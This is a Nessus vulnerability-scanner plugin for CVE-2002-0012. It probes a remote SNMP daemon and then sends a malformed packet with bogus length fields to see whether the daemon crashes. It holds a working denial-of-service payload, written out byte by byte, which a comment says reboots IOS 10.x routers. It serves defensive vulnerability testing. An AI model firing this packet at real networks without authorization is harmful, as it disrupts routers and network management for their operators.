#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10858);
 script_bugtraq_id(4088);
 script_cve_id("CVE-2002-0012");
 script_version ("$Revision: 1.12 $");
 
 name["english"] = "SNMP bad length field DoS (2)";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to disable the remote SNMP daemon by sending
a malformed packet advertising bogus length fields.

An attacker may use this flaw to prevent you from using
SNMP to administer your network (or use other flaws
to execute arbitrary code with the privileges of the 
SNMP daemon).

Solution : see www.cert.org/advisories/CA-2002-03.html
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "snmpd DoS";

 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("snmp_settings.nasl");
 script_require_keys("SNMP/community");
 exit(0);
}

#
# The script code starts here
#


#
# Crashes IOS 10.x and possibly others. The router reboots by itself
# in a few seconds.
#
# This is based on test case c06-snmpv1-req-enc-r1-1150 of
# the Protos Test Suite - see 
# http://www.ee.oulu.fi/research/ouspg/protos/testing/c06/snmpv1/
# for details
# 
# 
#

community = get_kb_item("SNMP/community");
if(!community)exit(0);

port = get_kb_item("SNMP/port");
if(!port) port = 161;

function snmp_ping()
{

 SNMP_BASE = 31;
	COMMUNITY_SIZE = strlen(community);
	
	sz = COMMUNITY_SIZE % 256;
	

	len = SNMP_BASE + COMMUNITY_SIZE;
	len_hi = len / 256;
	len_lo = len % 256;
	sendata = raw_string(
		0x30, 0x82, len_hi, len_lo, 
		0x02, 0x01, 0x00, 0x04,
		sz);
		
		
	sendata = sendata + community +
		raw_string( 0xA1, 
		0x18, 0x02, 0x01, 0x01, 
		0x02, 0x01, 0x00, 0x02, 
		0x01, 0x00, 0x30, 0x0D, 
		0x30, 0x82, 0x00, 0x09, 
		0x06, 0x05, 0x2B, 0x06, 
		0x01, 0x02, 0x01, 0x05, 
		0x00); 

	
	dstport = port;
	soc = open_sock_udp(dstport);
	send(socket:soc, data:sendata);
	result = recv(socket:soc, length:4096, timeout:3);
        close(soc);
	if(result)return(1);
	else return(0);
	
}


if(snmp_ping())
{
sz = strlen(community);
sz = sz % 256;


pkt = string(raw_string(0x30, 0x2b, 0x02, 0x01, 0x00, 0x04,
sz), community, raw_string( 0xa0, 0x1e, 0x02, 0x02, 0x04,
0x7e, 0x02, 0x01, 0x00,
0x02, 0x01, 0x00, 0x30, 0x12, 0x30, 0x10, 0x06, 
0x84, 0x7F, 0xFF, 0xFF, 0xFF, 0x2B, 0x06, 0x01,
0x02, 0x1, 0x01, 0x05, 0x00, 0x05, 0x00));              



soc = open_sock_udp(port);
send(socket:soc, data:pkt);
close(soc);
if(!snmp_ping())security_hole(port:port, protocol:"udp");
}
